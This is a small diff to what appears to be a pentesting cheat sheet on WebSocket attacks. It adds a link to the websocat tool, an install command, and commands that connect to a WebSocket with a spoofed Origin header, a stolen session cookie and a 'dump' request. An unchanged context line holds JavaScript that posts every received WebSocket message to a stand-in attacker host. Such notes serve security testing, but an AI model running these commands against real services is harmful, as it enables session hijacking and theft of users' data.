@@ -56,8 +56,11 @@ ws.onmessage = e => fetch("https://ATTACKER/", {method:"POST", body:e.data})
 
 ## Origin
 
+Tool: https://github.com/vi/websocat
+
 ```bash
+cargo install websocat
 websocat -H='Origin: https://ATTACKER' ws://HOST/ws
 websocat -H='Cookie: session=COOKIE' ws://HOST/ws
+printf '{"type":"dump"}\n' | websocat -H='Cookie: session=COOKIE' ws://HOST/ws
 ```
-
